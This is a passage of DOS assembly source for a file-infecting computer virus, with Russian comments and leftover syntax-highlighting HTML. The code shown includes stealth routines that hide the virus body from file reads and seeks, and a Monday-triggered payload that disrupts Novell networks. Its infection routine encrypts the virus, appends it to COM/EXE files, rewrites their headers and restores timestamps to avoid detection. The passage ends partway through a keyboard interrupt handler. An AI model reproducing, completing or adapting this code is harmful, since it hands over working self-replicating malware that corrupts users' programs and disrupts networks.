                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; no parameters entered?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">writeparam</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">          </span><span class="sc1">; search for the cr(lf)</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">127</span><span class="sc0">
                        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">noparam</span><span class="sc0">         </span><span class="sc1">; error?</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc5">writeparam</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">; increase lenght of</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">; the command line</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">wino32bit</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; write new params...</span><span class="sc0">
 </span><span class="sc5">noparam</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                        </span><span class="sc6">clc</span><span class="sc0">                     </span><span class="sc1">; exit, file is okay!</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Checks the handle (Disk file?)</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">handlecheck</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4400h</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">hcerr</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">hcerr</span><span class="sc0">
                        </span><span class="sc6">clc</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">hcerr</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">stc</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; subroutine to decrease number of read bytes and remove lseek from virus zone</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">seekhide</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2eof</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
                        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">hidevirus</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">not_us</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">not_us</span><span class="sc0">

 </span><span class="sc5">hidevirus</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">nrbytes</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; subtract number of read bytes</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

 </span><span class="sc5">not_us</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restoreseek</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; lseek tools</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">seeksave</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_cur</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">restoreseek</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_bof</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">seek2bof</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realseek</span><span class="sc0">

 </span><span class="sc5">seek2eof</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realseek</span><span class="sc0">

 </span><span class="sc5">seekfrom_eof</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realseek</span><span class="sc0">

 </span><span class="sc5">seekfrom_cur</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realseek</span><span class="sc0">

 </span><span class="sc5">seekfrom_bof</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">

 </span><span class="sc5">realseek</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Upper case AX</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">upreg</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">goodchar</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">goodchar</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
 </span><span class="sc5">goodchar</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">_good_</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">_good_</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
 </span><span class="sc5">_good_</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁ</span><span class="sc0">
</span><span class="sc1">; ЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁ Всякая хуйня для Novell Network ЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁ</span><span class="sc0">
</span><span class="sc1">; ЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁ</span><span class="sc0">
 </span><span class="sc5">novell</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">pushall</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7a00h</span><span class="sc0">        </span><span class="sc1">; Novell installation check</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_novell</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">          </span><span class="sc1">; Который час? (день..)</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Понедельник?</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_novell</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">          </span><span class="sc1">; 5 минут нн-го?</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_send</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; случайное число</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">         </span><span class="sc1">; [0..7]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; послать сообщение</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; 1 connection</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; connection #</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc5">endnmess</span><span class="sc4">-</span><span class="sc5">nmess</span><span class="sc0"> </span><span class="sc1">; длина мессаги</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">nmess</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endnmess</span><span class="sc4">-</span><span class="sc5">nmess</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e1h</span><span class="sc0">         </span><span class="sc1">; отправить фак</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">two_bytes</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc5">fake_down</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">fake_down</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0"> </span><span class="sc1">; длина сообщения</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">two_bytes</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e1h</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_novell</span><span class="sc0">

 </span><span class="sc5">no_send</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">17</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_novell</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0d7h</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

 </span><span class="sc5">no_novell</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc5">popall</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; запись зашифрованного тела вируса в файл</span><span class="sc0">
</span><span class="sc1">; самое главное в этом вирусе (поставьте тута ret и все к е(и)бени матери)</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
  </span><span class="sc5">writevirus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; запрос времени/даты последнего</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">                   </span><span class="sc1">; модифицирования файла</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; сохранить в стеке</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                  </span><span class="sc1">; запрос текущего времени</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">                   </span><span class="sc1">; в dx:cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; восстановить в ax и сохранить снова</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; время</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; берем часы (биты 11-15 в cx)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">; совпадают? если да, то съябываемся,</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">write_fail</span><span class="sc0">              </span><span class="sc1">; чтобы не засветиться</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2eof</span><span class="sc0">                </span><span class="sc1">; а иначе идем в конец файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; записываемся в файл</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_int21_crypt</span><span class="sc0">       </span><span class="sc1">; сначала зашифруемся</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; все vsize байт записались?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">write_fail</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2bof</span><span class="sc0">                </span><span class="sc1">; идем в начало</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; записываем видоизмененный</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">                   </span><span class="sc1">; заголовок com/exe файла</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
  </span><span class="sc5">write_fail</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; вынуть дату и время файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">; установить ее обратно</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">MEM_ENC_END</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc1">; Обработчик прерывания int 09h</span><span class="sc0">
 </span><span class="sc5">int9</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pusha</span><span class="sc0">                    </span><span class="sc1">; сохранить используемые регистры</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">            </span><span class="sc1">; ds=cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

